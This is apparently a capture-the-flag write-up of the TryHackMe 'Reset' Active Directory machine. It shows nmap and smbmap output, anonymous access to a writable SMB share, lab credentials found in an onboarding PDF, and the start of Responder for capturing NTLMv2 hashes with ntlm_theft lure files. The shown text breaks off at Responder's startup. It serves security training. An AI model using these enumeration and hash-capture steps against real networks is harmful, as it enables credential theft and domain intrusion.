---
layout: post
title: "Try Hack Me: Reset"
date: 2025-06-17
categories: [TryHackMe, Writeup]
tags: [Windows, hard, Bloodhound, Active Directory, NTLMRelayx]
permalink: /posts/Reset/
toc: true
---

![Description](/assets/images/Reset/Capture%20d’écran%202025-06-17%20025913.png)

**Reset** is a **hard-difficulty Windows machine** from TryHackMe that tests your skills in enumeration, credential abuse, and **Active Directory** exploitation.
The challenge begins with anonymous SMB share enumeration, where sensitive onboarding documents reveal user credentials. 
You then perform an NTLMv2 hash capture via **writable SMB shares**, crack the hash, and gain initial access. 
From there, you pivot across users using techniques such as **GenericAll**, **ForceChangePassword**, and **delegation abuse**, ultimately escalating 
privileges to **Domain Administrator**.

##  Enumeration
### nmap scan
We begin with an Nmap scan:

```bash
┌──(sanke㉿vbox)-[~/Downloads/reset]
└─$ nmap 10.10.158.105 -A -v 

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-15 19:49:33Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-15T19:49:42+00:00
|_ssl-date: 2025-06-15T19:50:22+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Issuer: commonName=HayStack.thm.corp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-14T19:19:53
| Not valid after:  2025-12-14T19:19:53
| MD5:   02bc:ac16:f3c5:4c3b:3734:c3b1:a16b:447a
|_SHA-1: 7eb4:88e4:9536:722a:89a0:37ca:4e31:7656:9331:c305
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-15T19:49:43
|_  start_date: N/A

```

Nmap revealed several open ports commonly associated with Active Directory environments, 
confirming the target is a Windows domain-joined machine running services like Kerberos, LDAP, SMB, and WinRM.

### SMB share enumeration
What i did first is enumerating the SMB shares using anonymous login.

```bash
┌──(sanke㉿vbox)-[~/Downloads/reset]
└─$ smbmap -H 10.10.158.105 -u 'anonymous' --no-pass

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.158.105:445       Name: 10.10.158.105             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Data                                                    READ, WRITE
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
[*] Closed 1 connections                                                                                                     
```

We have an interesting share here that got READ,WRITE Permissions. 
What i did first is try to access the Data share and download all the files there … Maybe we can find some useful credentials.

``` bash
smbclient //10.10.158.105/Data -N 

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun 15 15:56:19 2025
  ..                                  D        0  Sun Jun 15 15:56:19 2025
  onboarding                          D        0  Sun Jun 15 15:57:15 2025

                7863807 blocks of size 4096. 3024094 blocks available
smb: \> cd onboarding
smb: \onboarding\> ls
  .                                   D        0  Sun Jun 15 15:57:45 2025
  ..                                  D        0  Sun Jun 15 15:57:45 2025
  du5g5vzy.vst.pdf                    A  3032659  Mon Jul 17 04:12:09 2023
  sgefa03l.5lk.pdf                    A  4700896  Mon Jul 17 04:11:53 2023
  ud2kqbn0.eny.txt                    A      521  Mon Aug 21 14:21:59 2023

                7863807 blocks of size 4096. 3024048 blocks available
```
I downloaded the 3 files and when opening a pdf file , I found an email in one of the layouts.

![Description](/assets/images/Reset/em.png)

##  Exploitation
### initial foothold
We found credentials Lily/ResetMe123!

But I was suffering in this step. I tried everything but nothing worked for me and I was thinking maybe it’s a rabbit hole after all. 
As i was thinking, I remember that we have WRITE permissions on the Data share. Let’s go ahead and use the famous tool “ntlm_theft”
PS: ntlm_theft is primarily aimed at Penetration Testers and Red Teamers, who will use it to perform internal phishing on target company employees. NTLM theft means capturing the **NTLM authentication hash** (the password hash used in NTLM auth) and then crack it offline to get the password.
Okay first of all, we need to download our tool from the official github which is (https://github.com/Greenwolf/ntlm_theft). Then we need to start a responder which is gonna intercept NTLMv2 hashes when a victim opens a malicious file.

```bash
┌──(sanke㉿vbox)-[~/Downloads/reset]
└─$ sudo responder -I tun0

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] You don't have an IPv6 address assigned.

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.8.70.151]
    Responder IPv6             [::1]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-K9JDJ978DNO]
    Responder Domain Name      [8KJ2.LOCAL]
    Responder DCE-RPC Port     [45238]

[+] Listening for events...

```
